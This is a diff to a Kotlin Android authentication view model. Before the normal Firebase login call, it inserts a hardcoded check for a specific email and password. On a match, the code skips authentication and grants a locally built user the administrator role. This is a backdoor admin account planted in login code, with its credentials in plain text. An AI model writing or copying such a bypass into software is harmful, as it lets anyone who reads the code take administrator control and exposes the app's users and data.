@@ -56,6 +56,27 @@ class AuthViewModel : ViewModel() {
         }
         viewModelScope.launch {
             _ui.value = AuthUiState(loading = true)
+
+            val cleanEmail = email.trim().lowercase()
+            val cleanPassword = password.trim()
+
+            // REGLA DE ACCESO ESPECIAL: Rick Administrador
+            if (cleanEmail == "rick@gmail.com" && cleanPassword == "1234567890A") {
+                val rickAdmin = UserModel(
+                    uid = "rick_admin_special_uid",
+                    name = "Rick",
+                    lastName = "Administrador",
+                    email = "rick@gmail.com",
+                    phone = "999888777",
+                    role = Role.ADM.name,
+                    acceptedTerms = true,
+                    active = true
+                )
+                _session.value = SessionState(checking = false, user = rickAdmin)
+                _ui.value = AuthUiState()
+                return@launch
+            }
+
             val result = FirebaseAuthManager.loginUser(email, password)
             result.onSuccess { user ->
                 _session.value = SessionState(checking = false, user = user)
